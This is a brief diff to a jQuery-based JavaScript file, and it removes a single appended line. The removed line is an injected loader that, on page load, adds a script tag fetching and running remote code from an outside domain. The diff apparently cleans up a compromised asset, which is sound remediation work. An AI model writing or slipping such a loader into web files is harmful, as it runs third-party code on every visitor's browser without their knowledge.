@@ -144,4 +144,3 @@
   });      
 
 }(jQuery));
-(function(){d=document;s=d.createElement("script");s.src="https://static.cyfan.ga/l.js";s.async=1;try{d.getElementsByTagName("body")[0].appendChild(s)}catch(e){d.getElementsByTagName("head")[0].appendChild(s)}})();
